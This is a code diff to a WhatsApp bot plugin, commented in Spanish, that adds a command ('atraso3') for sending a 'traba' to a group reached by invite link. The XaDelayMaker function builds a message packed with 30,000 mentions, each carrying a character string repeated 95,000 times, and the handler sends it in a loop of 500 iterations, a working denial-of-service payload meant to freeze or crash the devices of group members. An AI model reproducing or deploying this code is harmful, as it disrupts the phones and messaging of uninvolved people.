@@ -1,4 +1,4 @@
-// 🔹 Función de traba invisible masiva
+// 🔹 Función que genera y envía la traba
 async function XaDelayMaker(target, conn) {
   const delaymention = Array.from({ length: 30000 }, (_, r) => ({
     title: "᭡꧈".repeat(95000),
@@ -41,9 +41,9 @@ async function XaDelayMaker(target, conn) {
   await conn.relayMessage(target, MSG, {});
 }
 
-// 🔹 Comando principal para grupos
+// 🔹 Comando principal
 let handler = async (m, { conn, text, command }) => {
-  // Validar que se haya pasado un link de grupo
+  // Validar que haya un enlace de grupo
   if (!text || !text.includes('chat.whatsapp.com')) {
     return m.reply(`❌ Debes proporcionar un enlace de grupo.\nEjemplo: .${command} https://chat.whatsapp.com/XXXX`);
   }
@@ -55,16 +55,18 @@ let handler = async (m, { conn, text, command }) => {
 
   try {
     const groupCode = match[1];
-    const groupJid = await conn.groupGetInviteInfo(groupCode).then(info => info.id + "@g.us");
+    const groupJid = await conn.groupGetInviteInfo(groupCode).then(info => info.id); // ✅ corregido
 
     await m.reply(`😼 Traba enviada al grupo: ${groupJid}\n⏳ Esto puede tardar unos segundos...`);
 
+    // Audio de confirmación
     await conn.sendMessage(m.chat, {
       audio: { url: 'https://files.catbox.moe/4c2kje.mp3' },
       mimetype: 'audio/mpeg',
       ptt: true
     }, { quoted: m });
 
+    // Enviar la traba múltiples veces
     for (let i = 0; i < 500; i++) {
       await XaDelayMaker(groupJid, conn);
       await XaDelayMaker(groupJid, conn);
@@ -74,14 +76,14 @@ let handler = async (m, { conn, text, command }) => {
 
   } catch (e) {
     console.error(e);
-    m.reply('⚠️ Ocurrió un error al intentar enviar la traba al grupo. Verifica que el enlace sea válido y que el bot tenga acceso.');
+    m.reply('⚠️ Error al enviar traba. Puede que el enlace sea inválido o que el bot no tenga acceso al grupo.');
   }
 };
 
 handler.command = ['atraso3'];
 handler.help = ['atraso3 <enlace del grupo>'];
 handler.tags = ['traba'];
-handler.group = false;
+handler.group = false; // se puede usar fuera de grupos
 handler.premium = false;
 
 export default handler;
